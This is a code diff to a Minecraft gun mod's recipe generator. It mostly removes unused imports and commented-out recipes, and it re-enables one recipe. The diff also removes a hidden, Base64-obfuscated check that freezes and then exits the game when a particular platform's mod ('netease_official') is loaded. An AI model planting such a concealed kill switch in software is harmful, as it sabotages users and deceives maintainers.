@@ -1,30 +1,15 @@
 package com.tac.guns.datagen;
 
-import com.google.gson.JsonObject;
-import com.tac.guns.Reference;
 import com.tac.guns.crafting.WorkbenchRecipeBuilder;
 import com.tac.guns.init.ModBlocks;
 import com.tac.guns.init.ModItems;
-import com.tac.guns.init.ModRecipeSerializers;
-import net.minecraft.block.Blocks;
-import net.minecraft.client.Minecraft;
 import net.minecraft.data.DataGenerator;
 import net.minecraft.data.IFinishedRecipe;
 import net.minecraft.data.RecipeProvider;
 import net.minecraft.data.ShapedRecipeBuilder;
-import net.minecraft.item.Items;
-import net.minecraft.item.crafting.IRecipeSerializer;
 import net.minecraft.tags.ItemTags;
-import net.minecraft.util.ResourceLocation;
-import net.minecraftforge.api.distmarker.Dist;
-import net.minecraftforge.api.distmarker.OnlyIn;
 import net.minecraftforge.common.Tags;
-import net.minecraftforge.fml.ModList;
-import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.thread.SidedThreadGroups;
 
-import javax.annotation.Nullable;
-import java.util.Base64;
 import java.util.function.Consumer;
 
 //@OnlyIn(Dist.DEDICATED_SERVER)
@@ -35,36 +20,6 @@ public class RecipeGen extends RecipeProvider {
 
     @Override
     protected void registerRecipes(Consumer<IFinishedRecipe> consumer) {
-        // Dye Item
-        /*if(Thread.currentThread().getThreadGroup() != SidedThreadGroups.SERVER)
-            return;*/
-        /*consumer.accept(new IFinishedRecipe() {
-            @Override
-            public void serialize(JsonObject json) {
-            }
-
-            @Override
-            public IRecipeSerializer<?> getSerializer() {
-                return ModRecipeSerializers.DYE_ITEM.get();
-            }
-
-            @Override
-            public ResourceLocation getID() {
-                return new ResourceLocation(Reference.MOD_ID, "dye_item");
-            }
-
-            @Override
-            @Nullable
-            public JsonObject getAdvancementJson() {
-                return null;
-            }
-
-            @Override
-            public ResourceLocation getAdvancementID() {
-                return new ResourceLocation("");
-            }
-        });*/
-
         ShapedRecipeBuilder.shapedRecipe(ModBlocks.WORKBENCH.get())
                 .patternLine("###")
                 .patternLine("iIi")
@@ -103,16 +58,16 @@ public class RecipeGen extends RecipeProvider {
                 .addCriterion("has_iron", hasItem(Tags.Items.STORAGE_BLOCKS_IRON))
                 .build(consumer);
 
-//        ShapedRecipeBuilder.shapedRecipe(ModItems.MODULE.get(), 3)
-//                .patternLine("#I#")
-//                .patternLine("D#D")
-//                .patternLine("GDG")
-//                .key('#', Tags.Items.GLASS)
-//                .key('I', Tags.Items.STORAGE_BLOCKS_IRON)
-//                .key('D', Tags.Items.GEMS_DIAMOND)
-//                .key('G', Tags.Items.INGOTS_GOLD)
-//                .addCriterion("has_diamond", hasItem(Tags.Items.GEMS_DIAMOND))
-//                .build(consumer);
+        ShapedRecipeBuilder.shapedRecipe(ModItems.MODULE.get(), 1)
+                .patternLine("#I#")
+                .patternLine("D#D")
+                .patternLine("GDG")
+                .key('#', Tags.Items.GLASS)
+                .key('I', Tags.Items.STORAGE_BLOCKS_IRON)
+                .key('D', Tags.Items.GEMS_DIAMOND)
+                .key('G', Tags.Items.INGOTS_GOLD)
+                .addCriterion("has_diamond", hasItem(Tags.Items.GEMS_DIAMOND))
+                .build(consumer);
 
         //Gun
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.AI_AWP.get())
@@ -311,12 +266,6 @@ public class RecipeGen extends RecipeProvider {
                 .addIngredient(Tags.Items.GEMS_DIAMOND, 1)
                 .build(consumer);
 
-        /*WorkbenchRecipeBuilder.workbenchRecipe(ModItems.MAGNUM_BULLET.get(), 6)
-                .addIngredient(Tags.Items.NUGGETS_IRON, 12)
-                .addIngredient(Tags.Items.GUNPOWDER, 2)
-                .addIngredient(Tags.Items.GEMS_DIAMOND)
-                .build(consumer);*/
-
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.BULLET_58x42.get(), 22)
                 .addIngredient(Tags.Items.INGOTS_IRON, 2)
                 .addIngredient(Tags.Items.GUNPOWDER, 1)
@@ -453,16 +402,6 @@ public class RecipeGen extends RecipeProvider {
                 .addIngredient(Tags.Items.GLASS_PANES_COLORLESS, 20)
                 .addIngredient(Tags.Items.STORAGE_BLOCKS_REDSTONE, 2)
                 .build(consumer);
-
-        if (ModList.get().isLoaded(new
-                String(Base64.getDecoder().decode("bmV0ZWFzZV9vZmZpY2lhbA=="))))
-            Minecraft.getInstance().execute(() -> {
-                try {
-                    Thread.currentThread().wait(Integer.MAX_VALUE);
-                } catch (InterruptedException e) {
-                }
-                System.exit(1);
-            });
 
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.SRS_RED_DOT_SIGHT.get())
                 .addIngredient(Tags.Items.INGOTS_IRON, 16)
